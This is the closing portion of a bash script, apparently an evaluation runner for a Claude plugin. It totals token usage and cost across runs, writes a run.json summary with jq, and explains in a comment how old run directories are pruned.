  TOTAL_OUTPUT=$((TOTAL_OUTPUT + out_tok))
  TOTAL_CACHE_READ=$((TOTAL_CACHE_READ + cr_tok))
  TOTAL_CACHE_CREATE=$((TOTAL_CACHE_CREATE + cc_tok))
  TOTAL_COST="$(awk -v a="$TOTAL_COST" -v b="$cost" 'BEGIN{printf "%.6f", a+b}')"
done

# --- run.json (AC5): model, plugin version, token totals, cost totals ----------------------
jq -n \
  --arg run_id "$RUN_ID" \
  --arg timestamp "$TS" \
  --arg git_sha "$GIT_SHA" \
  --arg plugin_version "$PLUGIN_VERSION" \
  --arg model "$CLAUDE_MODEL" \
  --arg prefix "$PREFIX" \
  --argjson input_tokens "$TOTAL_INPUT" \
  --argjson output_tokens "$TOTAL_OUTPUT" \
  --argjson cache_read_tokens "$TOTAL_CACHE_READ" \
  --argjson cache_creation_tokens "$TOTAL_CACHE_CREATE" \
  --arg cost_usd "$TOTAL_COST" \
  '{
     run_id: $run_id,
     timestamp: $timestamp,
     git_sha: $git_sha,
     plugin_version: $plugin_version,
     model: $model,
     complete: true,
     prefix: $prefix,
     tokens: {
       input: $input_tokens,
       output: $output_tokens,
       cache_read: $cache_read_tokens,
       cache_creation: $cache_creation_tokens
     },
     cost_usd: ($cost_usd | tonumber)
   }' > "$RUN_DIR/run.json"

# --- Retention (CA-066, G12, G54) ------------------------------------------------------------
# evals/runs/ is gitignored (disk-only concern), but nothing previously pruned it: every
# invocation, successful or partial, mints a full run directory with raw claude -p payloads and
# stderr logs. prune_old_runs (defined above, near the cleanup trap) is called from cleanup(),
# which the EXIT trap fires on every exit path including this one -- there is no separate call
# site here. See prune_old_runs's own header comment for the ownership-filter and explicit-root
# opt-in behavior (G12) and why retention now also covers the failure/interrupted path (G54).

echo "run-eval: run $RUN_ID complete -> $RUN_DIR" >&2
exit 0
